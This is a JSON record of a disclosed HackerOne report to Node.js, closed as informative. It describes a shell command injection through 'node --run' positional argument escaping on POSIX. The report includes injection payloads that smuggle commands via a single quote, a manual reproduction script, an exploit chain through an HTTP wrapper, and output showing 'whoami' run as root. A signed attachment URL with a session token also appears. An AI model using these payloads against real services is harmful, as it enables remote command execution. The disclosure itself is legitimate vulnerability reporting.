@@ -1,0 +1,131 @@
+{
+  "id": 3817602,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODE3NjAy",
+  "url": "https://hackerone.com/reports/3817602",
+  "title": "Node --run POSIX positional argument escaping allows shell command injection",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "high",
+  "readable_substate": "Informative",
+  "created_at": "2026-06-22T15:21:24.038Z",
+  "submitted_at": "2026-06-22T15:21:24.484Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "yottt",
+    "url": "/yottt",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22984,
+    "url": "https://hackerone.com/nodejs",
+    "handle": "nodejs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js",
+      "twitter_handle": "nodejs",
+      "website": "https://nodejs.org",
+      "about": "The Node.js JavaScript Runtime"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-23T09:53:20.439Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-06-23T09:53:20.154Z",
+  "team_member_agreed_on_going_public_at": "2026-06-23T09:12:06.164Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# \n\n## Summary\n\nNode.js `node --run <script> -- <args>` attempts to append positional arguments to a package script after escaping each argument for the shell.\n\nOn POSIX platforms, the escaping logic handles single quotes incorrectly. A positional argument containing a single quote can break out of the intended quoted argument and inject additional shell syntax.\n\nThe attacker does not need to control `package.json` or the selected script. The demonstrated payload only controls one argument after `--`.\n\n## Affected Versions\n\nConfirmed vulnerable on Linux x64:\n\n| Version | Result |\n| --- | --- |\n| v22.23.0 | Vulnerable |\n| v24.17.0 | Vulnerable |\n| v26.3.1 | Vulnerable |\n\n`--run` was added in v22.0.0, so older versions that do not implement `--run` are not affected by this specific issue.\n\nWindows was not tested.\n\n## Attack Scenario\n\nA service, CI bot, build wrapper, or developer tool invokes a trusted package script through Node's built-in task runner and forwards a user-controlled value as a positional argument:\n\n```sh\nnode --run test -- \"$user_controlled_pattern\"\n```\n\nThe application expects the value after `--` to be delivered to the package script as data, such as a test name, filename, glob, branch name, or filter string.\n\nAn attacker supplies a value containing a single quote and shell metacharacters. Node's task runner incorrectly escapes the argument, causing the shell to execute attacker-controlled syntax as the user running `node --run`.\n\n## Exploit Chain Scenario\n\nThe included exploit-chain PoC models a realistic wrapper that does not use a shell at the application boundary.\n\nThe wrapper exposes an HTTP endpoint that receives a user-controlled query value and invokes Node with an argv array:\n\n```js\nspawn(process.execPath, ['--run', 'search', '--', userInput], {\n  shell: false\n});\n```\n\nThe trusted package script is only:\n\n```json\n{\n  \"scripts\": {\n    \"search\": \"node helper.js\"\n  }\n}\n```\n\nA safe request forwards `safe filter value` to `helper.js` and does not create the marker file.\n\nAn attack request forwards:\n\n```text\nSAFE_ARG'; printf \"chain-owned\" > \"$CHAIN_MARKER\"; #\n```\n\nEven though the wrapper used `shell: false`, Node's internal `--run` implementation converts the single argv element into shell syntax, truncates the helper argument to `SAFE_ARG\\`, and executes the injected `printf` redirection.\n\n## Why This Is Not Just Application Misuse\n\nPackage scripts themselves are shell commands, but Node exposes a separate documented boundary for arguments after `--`.\n\nThe Node.js CLI documentation says that arguments after `--` are appended to the script:\n\nhttps://github.com/nodejs/node/blob/2e190332d098124605962520182f3f279419149d/doc/api/cli.md#L2632-L2675\n\nNode's implementation also explicitly treats these values as positional arguments that need escaping before being appended:\n\nhttps://github.com/nodejs/node/blob/2e190332d098124605962520182f3f279419149d/src/node_task_runner.cc#L54-L79\n\nThe vulnerability is that Node's own escaping function does not preserve the argument boundary for single quotes on POSIX. The caller may have correctly passed a single literal argv element to `node --run`, but Node converts that argv element into shell syntax.\n\n## Root Cause Code Evidence\n\n`ProcessRunner` appends positional arguments by concatenating `EscapeShell(arg)` into a command string that is later passed to the shell with `-c`:\n\nhttps://github.com/nodejs/node/blob/2e190332d098124605962520182f3f279419149d/src/node_task_runner.cc#L54-L79\n\nThe POSIX branch of `EscapeShell()` wraps the argument in single quotes, but replaces embedded single quotes with `\\'`:\n\nhttps://github.com/nodejs/node/blob/2e190332d098124605962520182f3f279419149d/src/node_task_runner.cc#L173-L182\n\nIn POSIX shell syntax, a single quote cannot be escaped with backslash while inside single quotes. The resulting command string allows an embedded single quote to close the quoted argument.\n\nCurrent tests cover spaces and double quotes in positional arguments, but not single quotes:\n\nhttps://github.com/nodejs/node/blob/2e190332d098124605962520182f3f279419149d/test/parallel/test-node-run.js#L143-L157\n\n## Proof of Concept\n\nThe PoC creates a temporary package with a harmless script:\n\n```json\n{\n  \"scripts\": {\n    \"show\": \"printf \\\"received:%s\\\\n\\\"\"\n  }\n}\n```\n\nIt then invokes:\n\n```sh\nnode --run show -- \"SAFE_ARG'; printf \\\"command-injection\\\" > \\\"$NODE_RUN_POC_MARKER\\\"; #\"\n```\n\nExpected safe behavior:\n\nThe complete payload is passed as one literal positional argument and no marker file is created.\n\nActual behavior:\n\nThe shell executes the injected `printf` redirection and creates the marker file.\n\n## Command Execution Proof\n\nA second PoC uses the same bug to execute `whoami`:\n\n```text\nSAFE_ARG'; whoami > \"$NODE_RUN_COMMAND_OUTPUT\"; #\n```\n\nOutput from v26.3.1:\n\n```json\n{\n  \"nodeVersion\": \"v26.3.1\",\n  \"platform\": \"linux\",\n  \"arch\": \"x64\",\n  \"proof\": \"whoami command execution through node --run positional argument shell injection\",\n  \"vulnerable\": true,\n  \"payload\": \"SAFE_ARG'; whoami > \\\"$NODE_RUN_COMMAND_OUTPUT\\\"; #\",\n  \"command\": \"whoami\",\n  \"commandOutput\": \"root\",\n  \"commandOutputCreated\": true,\n  \"childExitCode\": 0,\n  \"stdout\": \"received:SAFE_ARG\\\\\\n\",\n  \"stderr\": \"\"\n}\n```\n\nThis shows arbitrary shell command execution as the operating-system user running the Node.js process. In a remotely reachable wrapper or CI service that forwards attacker-controlled input to `node --run ... --`, this becomes remote command execution in that service context.\n\n## Relevant Output\n\nFrom v26.3.1:\n\n```json\n{\n  \"nodeVersion\": \"v26.3.1\",\n  \"platform\": \"linux\",\n  \"arch\": \"x64\",\n  \"feature\": \"node --run positional argument forwarding\",\n  \"vulnerable\": true,\n  \"markerCreated\": true,\n  \"markerContent\": \"command-injection\",\n  \"childExitCode\": 0,\n  \"stdout\": \"received:SAFE_ARG\\\\\\n\",\n  \"stderr\": \"\",\n  \"payload\": \"SAFE_ARG'; printf \\\"command-injection\\\" > \\\"$NODE_RUN_POC_MARKER\\\"; #\"\n}\n```\n\nRaw outputs are included as attachments:\n\n* `node-v22.23.0-output.json`\n* `node-v24.17.0-output.json`\n* `node-v26.3.1-output.json`\n* `node-v26.3.1-whoami-output.json`\n* `node-v22.23.0-http-wrapper-chain-output.json`\n* `node-v24.17.0-http-wrapper-chain-output.json`\n* `node-v26.3.1-http-wrapper-chain-output.json`\n\nExploit-chain output from v26.3.1:\n\n```json\n{\n  \"nodeVersion\": \"v26.3.1\",\n  \"exploitChain\": \"remote HTTP input -> safe argv spawn wrapper -> node --run positional argument -> shell command injection\",\n  \"vulnerable\": true,\n  \"safeRequest\": {\n    \"markerCreated\": false,\n    \"helperObserved\": {\n      \"argv\": [\n        \"safe filter value\"\n      ]\n    }\n  },\n  \"attackRequest\": {\n    \"markerCreated\": true,\n    \"markerContent\": \"chain-owned\",\n    \"helperObserved\": {\n      \"argv\": [\n        \"SAFE_ARG\\\\\"\n      ]\n    },\n    \"childExitCode\": 0,\n    \"stderr\": \"\"\n  }\n}\n```\n\n## Manual Reproduction\n\nRun on a POSIX system with an affected Node.js version:\n\n```sh\nWORKDIR=\"$(mktemp -d)\"\ncd \"$WORKDIR\"\n\ncat > package.json <<'JSON'\n{\"scripts\":{\"show\":\"printf \\\"received:%s\\\\n\\\"\"}}\nJSON\n\nexport NODE_RUN_POC_MARKER=\"$WORKDIR/command-executed.txt\"\nPAYLOAD=\"SAFE_ARG'; printf \\\"command-injection\\\" > \\\"\\$NODE_RUN_POC_MARKER\\\"; #\"\n\nnode --run show -- \"$PAYLOAD\"\ncat \"$NODE_RUN_POC_MARKER\"\n```\n\nVulnerable output:\n\n```text\nreceived:SAFE_ARG\\\ncommand-injection\n```\n\nThe second line is printed by `cat` reading the marker file created by injected shell syntax.\n\n## Mitigation / Workaround\n\nApplications should avoid forwarding untrusted values to `node --run` until this is fixed.\n\nIf forwarding untrusted values is required, avoid `node --run` and invoke a trusted executable directly with an argv array through `child_process.spawn()` or equivalent APIs that do not concatenate arguments into a shell command string.\n\n## Patch Direction\n\nThe upstream fix should ensure that positional arguments after `--` cannot alter shell syntax when appended to the package script.\n\nPossible directions include using a correct POSIX single-quote escaping strategy, or changing the invocation model so positional arguments are passed as shell positional parameters rather than concatenated into the script string.\n\nThe final upstream fix may choose a different implementation.\n\n## Impact\n\n## \n\nThis is command injection in the `node --run` positional argument forwarding boundary on POSIX.\n\nThis is especially security-relevant because the application boundary may use child_process.spawn() with an argv array and shell: false; the shell interpretation is introduced later by Node's internal --run task runner.\n\nImpact depends on the privileges of the process invoking Node. In CI, build automation, internal web tooling, or wrapper services, this can become remote code execution as the account running the job.\n\nThe strongest impact occurs when the attacker can influence an argument after `--` but cannot otherwise control the package script or the shell command being executed.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6133459,
+      "file_name": "PoC-node-run-positional-argument-shell-injection.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mm4crg527n0qa3vtnoxnn64jv958?response-content-disposition=attachment%3B%20filename%3D%22PoC-node-run-positional-argument-shell-injection.zip%22%3B%20filename%2A%3DUTF-8%27%27PoC-node-run-positional-argument-shell-injection.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVLU6JKMW%2F20260623%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260623T101458Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEFEaCXVzLXdlc3QtMiJHMEUCIDt5GA%2Bfmw1BT9SGsDUiUwJFZPcIJ5rtTO2x0%2BgovflhAiEAqXF1CMOGgeQyAi1QHukVFeXQu2uuUuYTvKfdL45dTwEqsQUIGhADGgwwMTM2MTkyNzQ4NDkiDOQuBlv%2Fy4vIWszoLSqOBY5OiTNBdEEiZ7iXZHGYe7TdpdoRN2JL8Ju3dB3Y4odupnSPOko8%2FyUIzZTtjLHuYK52Dg6Dq3gCDmxVJ313ICt%2F1f0ZFZ7CvtUCsZvBJmONKyW7GM1DLAHzcGBNFXb%2BoyUgDHemvWTXVTtU1NoNPP%2FxNr73l%2FEuatCm9o0FVk2U6rRTWQbJdp0JhcxanNu9mGcMWpueme8pbQq7s9NA9CJ%2B%2B6s22O2mSAk5TGL5mpmm4llcnfLGXwil%2FknSDWJS2s%2FhGdgjEaitpQweCedt%2Fd9SEjTT4f8aC9TuP0QwvGwsDXGN%2FA%2B%2B9jpq1fovsm5k%2F0l3oazA4u14ugLU40vftwY0FY1Wx1IhpN%2FbCg7UsYSdQ2%2BlXSnGEHUPr%2BDVmCq0fNtkMypjzVC1giERwGaiO9gPKo4WWDzq3n6jXVV%2FMhJUuEQBIoguoRKW8vwM1WRzjfA0MZyOy7cuhgnQaYp%2FTQJCkNyk5aeWENHsOag09%2BuEzgRYxZC0umTIS0Fb5GgQx5tBXHeMKW7w7DdWJHsRgTWsvRhorkbJQO9eG9XPApLalmxy4EpRTl5D9b8SwvDoH36hUGMx4VugaCA%2FMzXeoa5Cot8U%2BAg9Luw625l2zy7MAnJXOJY4m6UXPK76aDz0ZB7DSEv3EuhuLEPXAhbkIn1Xk61jCcbogO24Smo0gdg2XGvJVVUty8XUsGALbKRxQaL3iLVIdBRFyypTojgrSnCZ4mNK%2BhjDDxM3Ll1X8x%2BVYRPQKmvI9JmgFih8Xj%2B1LLrvAZcER8LsKGrdqd4Gx8wf3BXMDm%2BuucC6DhpNf%2BITd53UfK27Knrz9X0zjSk2%2FfL9vHao0jes9sWIQGGdyx46Z6PEC63bt6ky3Vk2uDDVjunRBjqxAUOu5QqLcJhLSivqRnJBoJCWshMviSWERvQFNDbvRkJvK%2Bsfd2iJdMPocaXavSFAete%2Bkc0Cp241o8wihSqtx8w5nNduQwCesmYN7VQxmNph35IL2BuCrSXOyaQIMaQZIkKy8YL8LpgKqK6mC%2BMozVWEdIZxgxHLbaeDzMcQXE%2BwyCHFyzaWLZbLIHMzMc1hVwLYIyvEvC6GJnpfjamFcReKDcEHz6w1vRb4mTaC2Usivg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b95daaca3ea1e2470032c69caf87f303d69922791e2684933c2596b68f801b37",
+      "file_size": 7559,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "high",
+    "score": 8.1,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 666,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/nodejs/node",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
